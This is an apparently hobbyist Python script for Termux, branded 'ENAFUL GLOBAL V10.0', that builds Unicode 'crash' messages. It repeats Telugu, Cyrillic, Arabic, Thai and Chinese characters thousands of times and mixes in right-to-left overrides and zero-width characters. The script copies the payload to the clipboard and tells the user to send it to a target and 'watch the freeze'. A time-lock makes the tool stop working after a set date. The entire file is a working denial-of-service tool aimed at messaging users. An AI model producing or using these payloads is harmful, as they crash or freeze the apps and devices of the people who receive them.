import os
import time
import sys
from datetime import datetime, timedelta

# --- TIME LOCK SYSTEM (Expires in 10 Days) ---
# টুলটি তৈরি করার তারিখ এবং ১০ দিন পরের তারিখ সেট করা হয়েছে
EXPIRY_DATE = datetime(2026, 5, 22) # আপনি চাইলে এখানে তারিখ পরিবর্তন করতে পারেন

def check_expiry():
    current_date = datetime.now()
    if current_date > EXPIRY_DATE:
        os.system('clear')
        print("\033[1;31m")
        print("###############################################")
        print("#          TOOL EXPIRED / টুলটি শেষ          #")
        print("#      CONTACT OWNER: ENAFUL FOR UPDATE       #")
        print("###############################################")
        sys.exit()

# ক্লিপবোর্ডে অটো-কপি ফাংশন
def copy_to_clipboard(text):
    try:
        if os.path.exists('/data/data/com.termux/files/usr/bin/termux-clipboard-set'):
            with open("temp_payload.txt", "w", encoding="utf-8") as f:
                f.write(text)
            os.system("cat temp_payload.txt | termux-clipboard-set")
            os.remove("temp_payload.txt")
            return True
    except:
        return False
    return False

# --- PURE MALICIOUS UNICODE DATABASE (V10.0 GLOBAL) ---
Z_W_J = "\u200D" * 2500     # Zero Width Joiner
RTL = "\u202E" * 1200       # Right-to-Left Chaos
THAI = "\u0E31" * 1000      # Thai Stresser
ARABIC = "\u061C" * 800     # Arabic Lag
CHINESE = "\u4E00" * 700    # Chinese Overflow
ZERO_WIDTH = "\u200B" * 2500 # Invisible Memory Eater

crash_db = {
    "V1_STRIKE": ("జ్ఞা" * 1500) + ("ॣ" * 1200) + Z_W_J,
    
    "V2_OVERLOAD": ("꧅" * 2000) + ("Ђ" * 1200) + RTL,
    
    "V3_FREEZER": (ARABIC + "﷽" + RTL) * 1800 + THAI * 800,
    
    "V4_ULTIMATE": ("🏴‍☠️" + Z_W_J + "☣️" + THAI + CHINESE) * 2000 + RTL,

    # THE MASTER WEAPON - ENAFUL GLOBAL V10.0
    "V5_ENAFUL_GLOBAL_V10": (
        ("జ్ఞা" * 2000) + ("꧅" * 2000) + ("﷽" * 2000) + 
        (Z_W_J * 3) + (RTL * 3) + (THAI * 1500) + (CHINESE * 1000) +
        ("\u1160" * 2500) + (ZERO_WIDTH)
    )
}

def banner():
    os.system('clear')
    print("\033[1;32m") # Hacker Green
    print("""
    ███████╗███╗   ██╗ █████╗ ███████╗██╗   ██╗██╗
    ██╔════╝████╗  ██║██╔══██╗██╔════╝██║   ██║██║
    █████╗  ██╔██╗ ██║███████║█████╗  ██║   ██║██║
    ██╔══╝  ██║╚██╗██║██╔══██║██╔══╝  ██║   ██║██║
    ███████╗██║ ╚████║██║  ██║██║     ╚██████╔╝███████╗
    ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝
    \033[1;31m[!] SYSTEM: ENAFUL GLOBAL V10.0
    \033[1;33m[!] OWNER: ENAFUL (GOD MODE)
    \033[1;36m[!] STATUS: READY TO DESTROY WORLDWIDE
    \033[1;32m""")

def start_engine(key):
    # প্রতিবার ইঞ্জিন স্টার্ট হওয়ার আগে এক্সপায়ারি চেক করবে
    check_expiry()
    
    payload = crash_db.get(key)
    print(f"\033[1;31m[*] LOADING WEAPON: {key}")
    time.sleep(1)
    
    if copy_to_clipboard(payload):
        print("\033[1;32m[+] SUCCESS: PAYLOAD READY IN CLIPBOARD!")
    else:
        print("\033[1;31m[-] ERROR: MANUAL COPY REQUIRED!")

    print("\n\033[1;37m" + payload[:60] + ".... [ENAFUL-V10-STABLE]")
    print("\n\033[1;33m[!] MISSION: SEND TO TARGET AND WATCH THE FREEZE.")

# মেইন লজিক
check_expiry() # শুরুতে একবার চেক করবে
banner()
print("\033[1;34mSELECT ATTACK VECTOR:")
print("1. Asia Strike (Telugu/Hindi)")
print("2. Euro/Russia Overload (Cyrillic)")
print("3. Arab/Thai Freezer (Arabic/Thai)")
print("4. Global Ultimate (Mixed Overflow)")
print("5. ENAFUL GLOBAL V10.0 (GOD LEVEL DESTROYER)")

choice = input("\n\033[1;32mENAFUL@ROOT:~# ")

mapping = {
    "1": "V1_STRIKE", 
    "2": "V2_OVERLOAD", 
    "3": "V3_FREEZER", 
    "4": "V4_ULTIMATE", 
    "5": "V5_ENAFUL_GLOBAL_V10"
}

if choice in mapping:
    start_engine(mapping[choice])
else:
    print("\033[1;31m[!] WRONG CHOICE, BOSS!")
    sys.exit()
